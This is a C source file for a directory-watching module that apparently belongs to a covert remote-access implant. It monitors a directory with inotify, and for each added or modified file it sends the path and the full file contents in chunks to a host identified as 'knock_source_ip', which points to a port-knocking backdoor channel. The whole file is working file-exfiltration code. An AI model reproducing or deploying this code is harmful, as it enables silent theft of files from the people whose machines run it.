#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <time.h>
#include <dirent.h>
#include <pthread.h>
#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/time.h>
#include "networking.h"
#include "watcher.h"

static long long now_ms(void) {
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000LL + ts.tv_nsec / 1000000LL;
}

static void snapshot_add(snapshot_t * snap, const char * path, const time_t mtime, const off_t size) {
    if (snap->count >= MAX_FILES) return;
    file_entry_t * entry = &snap->entries[snap->count++];
    strncpy(entry->path, path, RESPONSE_BUFFER_LENGTH - 1);
    entry->path[RESPONSE_BUFFER_LENGTH - 1] = '\0';
    entry->mtime = mtime;
    entry->size  = size;
}

static void build_snapshot_recursive(snapshot_t * snap, const char * dir) {
    DIR * directory = opendir(dir);
    if (directory == NULL) return;

    struct dirent * entry;
    while ((entry = readdir(directory)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        char full_path[RESPONSE_BUFFER_LENGTH];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir, entry->d_name);

        struct stat st;
        if (lstat(full_path, &st) < 0) continue;

        if (S_ISDIR(st.st_mode)) {
            build_snapshot_recursive(snap, full_path);
        } else if (S_ISREG(st.st_mode)) {
            snapshot_add(snap, full_path, st.st_mtime, st.st_size);
        }
    }

    closedir(directory);
}

static snapshot_t * build_snapshot(const char * root) {
    snapshot_t * snap = calloc(1, sizeof(snapshot_t));
    if (snap == NULL) return NULL;
    build_snapshot_recursive(snap, root);
    return snap;
}

static file_entry_t * snapshot_find(snapshot_t * snap, const char * path) {
    if (path == NULL) return NULL;
    for (int i = 0; i < snap->count; i++) {
        if (strcmp(snap->entries[i].path, path) == 0) {
            return &snap->entries[i];
        }
    }
    return NULL;
}

static change_list_t * diff_snapshots(snapshot_t * old_snap, snapshot_t * new_snap) {
    if (old_snap == NULL || new_snap == NULL) return NULL;
    change_list_t * changes = calloc(1, sizeof(change_list_t));
    if (changes == NULL) return NULL;

    for (int i = 0; i < new_snap->count; i++) {
        const file_entry_t * new_entry = &new_snap->entries[i];
        const file_entry_t * old_entry = snapshot_find(old_snap, new_entry->path);

        if (changes->count >= MAX_FILES) break;

        change_t * c = &changes->entries[changes->count];
        strncpy(c->path, new_entry->path, RESPONSE_BUFFER_LENGTH - 1);

        if (old_entry == NULL) {
            c->type = CHANGE_ADDED;
            changes->count++;
        } else if (old_entry->mtime != new_entry->mtime || old_entry->size != new_entry->size) {
            c->type = CHANGE_MODIFIED;
            changes->count++;
        }
    }

    for (int i = 0; i < old_snap->count; i++) {
        const file_entry_t * old_entry = &old_snap->entries[i];
        if (snapshot_find(new_snap, old_entry->path) == NULL) {
            if (changes->count >= MAX_FILES) break;
            change_t * c = &changes->entries[changes->count++];
            c->type = CHANGE_REMOVED;
            strncpy(c->path, old_entry->path, RESPONSE_BUFFER_LENGTH - 1);
        }
    }

    return changes;
}

static void register_watches_recursive(watch_table_t * watch_table, const char * dir) {
    if (watch_table->count >= MAX_WATCHES) return;

    const int watch_d = inotify_add_watch(watch_table->inotify_fd, dir, INOTIFY_FLAGS);
    if (watch_d < 0) {
        perror("inotify_add_watch");
        return;
    }

    watch_entry_t * watch_entry = &watch_table->watches[watch_table->count++];
    watch_entry->wd = watch_d;
    strncpy(watch_entry->path, dir, RESPONSE_BUFFER_LENGTH - 1);
    watch_entry->path[RESPONSE_BUFFER_LENGTH - 1] = '\0';

    DIR * directory = opendir(dir);
    if (directory == NULL) return;

    struct dirent * entry;
    while ((entry = readdir(directory)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        char full_path[RESPONSE_BUFFER_LENGTH];
        snprintf(full_path, sizeof(full_path), "%s/%s", dir, entry->d_name);

        struct stat st;
        if (lstat(full_path, &st) < 0) continue;

        if (S_ISDIR(st.st_mode)) {
            register_watches_recursive(watch_table, full_path);
        }
    }

    closedir(directory);
}

static watch_table_t * register_watches(const char * root) {
    watch_table_t * watch_table = calloc(1, sizeof(watch_table_t));
    if (watch_table == NULL) return NULL;

    watch_table->inotify_fd = inotify_init1(IN_NONBLOCK);
    if (watch_table->inotify_fd < 0) {
        perror("inotify_init1");
        free(watch_table);
        return NULL;
    }

    register_watches_recursive(watch_table, root);
    return watch_table;
}

static void free_watches(watch_table_t * watch_table) {
    if (watch_table == NULL) return;
    for (int i = 0; i < watch_table->count; i++) {
        inotify_rm_watch(watch_table->inotify_fd, watch_table->watches[i].wd);
    }
    close(watch_table->inotify_fd);
    free(watch_table);
}

static void run_workflows(const struct session_info * session_info, const change_list_t * changes) {
    if (changes == NULL || changes->count == 0) return;
    char * message_buffer = malloc(MESSAGE_BUFFER_LENGTH);
    if (message_buffer == NULL) return;

    for (int i = 0; i < changes->count; i++) {
        const change_t * c = &changes->entries[i];
        const char * type_str = c->type == CHANGE_ADDED   ? "ADDED"
                              : c->type == CHANGE_REMOVED ? "REMOVED"
                              : "MODIFIED";
        
        log_message("[WATCH] %-10s %s", type_str, c->path);

        const int bytes_written = snprintf(message_buffer, MESSAGE_BUFFER_LENGTH, "[WATCH] %-10s %s", type_str, c->path);
        message_buffer[bytes_written] = '\0';

        send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, message_buffer);
        usleep(500000);
        send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, RESPONSE);

        if (c->type != CHANGE_REMOVED) {
            sleep(2);
            FILE * file = fopen(c->path, "rb");
            if (file == NULL) {
                fprintf(stderr, "Failed to open file: %s\n", c->path);
                return;
            }

            char * file_buffer = malloc(MESSAGE_BUFFER_LENGTH);
            if (file_buffer == NULL) {
                fprintf(stderr, "Failed to allocate file buffer\n");
                fclose(file);
                return;
            }

            // Send over the filename and the FILENAME command
            send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, c->path);
            usleep(500000);
            send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, FILENAME);

            size_t chunk_count = 0;
            size_t chunk_bytes;
            while ((chunk_bytes = fread(file_buffer, 1, MESSAGE_BUFFER_LENGTH - 1, file)) > 0) {
                file_buffer[chunk_bytes] = '\0';
                send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, file_buffer);
                chunk_count++;
                printf("Sent chunk %zu (%zu bytes)\n", chunk_count, chunk_bytes);
                fflush(stdout);
            }

            printf("File transfer complete. Sent %zu chunks\n", chunk_count);
            fflush(stdout);

            fclose(file);
            free(file_buffer);

            usleep(500000);
            send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, SEND_FILE);
        }
    }

    free(message_buffer);
}

static int poll_events(const watch_table_t * watch_table, const int timeout_ms, int * overflow) {
    *overflow = 0;

    fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(watch_table->inotify_fd, &readfds);

    struct timeval tv;
    tv.tv_sec  = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;

    const int ret = select(watch_table->inotify_fd + 1, &readfds, NULL, NULL, &tv);
    if (ret <= 0) return ret;

    char buf[EVENT_BUF_SIZE] __attribute__((aligned(__alignof__(struct inotify_event))));
    const ssize_t len = read(watch_table->inotify_fd, buf, sizeof(buf));
    if (len < 0) {
        if (errno == EAGAIN) return 0;
        perror("read inotify");
        return -1;
    }

    const char * ptr = buf;
    while (ptr < buf + len) {
        const struct inotify_event * event = (const struct inotify_event *)ptr;
        if (event->mask & IN_Q_OVERFLOW) {
            *overflow = 1;
            break;
        }
        ptr += sizeof(struct inotify_event) + event->len;
    }

    return 1;
}

static void do_rescan(const struct session_info * session_info,
                         snapshot_t ** index,
                      watch_table_t ** watch_table,
                      const char * root) {
    snapshot_t    * new_index = build_snapshot(root);
    change_list_t * changes   = diff_snapshots(*index, new_index);

    free(*index);
    *index = new_index;

    run_workflows(session_info, changes);
    free(changes);

    free_watches(*watch_table);
    *watch_table = register_watches(root);
}

// NOLINTNEXTLINE
void * watch_directory(void * arg) {
    const struct session_info * session_info = arg;
    const char * root = session_info->watch_path;

    if (root == NULL) {
        log_message("Watch path is null");
        pthread_exit(NULL);
    }

    log_message("Starting directory watcher on: %s", root);

    snapshot_t    * index       = build_snapshot(root);
    watch_table_t * watch_table = register_watches(root);

    if (index == NULL || watch_table == NULL) {
        log_message("Failed to initialise watcher");
        free(index);
        free_watches(watch_table);
        pthread_exit(NULL);
    }

    while (session_info->run_watcher) {
        int overflow = 0;

        const int ret = poll_events(watch_table, 1000, &overflow);
        if (ret <= 0) continue;

        if (overflow) {
            do_rescan(session_info, &index, &watch_table, root);
            continue;
        }

        // Debounce loop
        long long last_event_time = now_ms();
        while (session_info->run_watcher) {
            const long long elapsed   = now_ms() - last_event_time;
            const int       remaining = (int)(DEBOUNCE_MS - elapsed);

            if (remaining <= 0) {
                do_rescan(session_info, &index, &watch_table, root);
                break;
            }

            const int more = poll_events(watch_table, remaining, &overflow);

            if (overflow) {
                do_rescan(session_info, &index, &watch_table, root);
                break;
            }

            if (more > 0) {
                last_event_time = now_ms();
            }
        }
    }

    log_message("Directory watcher stopped");
    free(index);
    free_watches(watch_table);
    free(session_info->watch_path);
    pthread_exit(NULL);
}